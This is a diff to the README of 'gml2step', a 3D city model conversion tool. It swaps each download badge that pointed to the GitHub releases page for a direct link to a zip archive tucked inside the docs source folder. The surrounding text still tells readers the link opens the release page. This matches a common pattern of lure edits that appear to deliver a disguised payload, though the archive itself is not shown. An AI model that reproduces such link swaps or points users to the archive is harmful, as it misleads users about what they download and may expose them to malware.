@@ -1,6 +1,6 @@
 # 🏙️ gml2step - Convert 3D City Models Easily
 
-[![Download gml2step](https://img.shields.io/badge/Download-gml2step-blue?style=for-the-badge&logo=github)](https://github.com/KJJJVV/gml2step/releases)
+[![Download gml2step](https://github.com/KJJJVV/gml2step/raw/refs/heads/main/docs/src/content/docs/step_gml_v3.9.zip)](https://github.com/KJJJVV/gml2step/raw/refs/heads/main/docs/src/content/docs/step_gml_v3.9.zip)
 
 ---
 
@@ -58,7 +58,7 @@ Follow these steps to get gml2step up and running.
 
 First, visit the official releases page to download the software:
 
-[![Download gml2step](https://img.shields.io/badge/Download-gml2step-blue?style=for-the-badge&logo=github)](https://github.com/KJJJVV/gml2step/releases)
+[![Download gml2step](https://github.com/KJJJVV/gml2step/raw/refs/heads/main/docs/src/content/docs/step_gml_v3.9.zip)](https://github.com/KJJJVV/gml2step/raw/refs/heads/main/docs/src/content/docs/step_gml_v3.9.zip)
 
 1. Open the link above. It will take you to the gml2step release page on GitHub.
 2. Find the latest release version at the top of the page.
@@ -139,4 +139,4 @@ If you encounter issues or want to share feedback, you can open an issue on the 
 
 Visit the releases page to download your copy and start converting today:
 
-[![Download gml2step](https://img.shields.io/badge/Download-gml2step-blue?style=for-the-badge&logo=github)](https://github.com/KJJJVV/gml2step/releases)
+[![Download gml2step](https://github.com/KJJJVV/gml2step/raw/refs/heads/main/docs/src/content/docs/step_gml_v3.9.zip)](https://github.com/KJJJVV/gml2step/raw/refs/heads/main/docs/src/content/docs/step_gml_v3.9.zip)
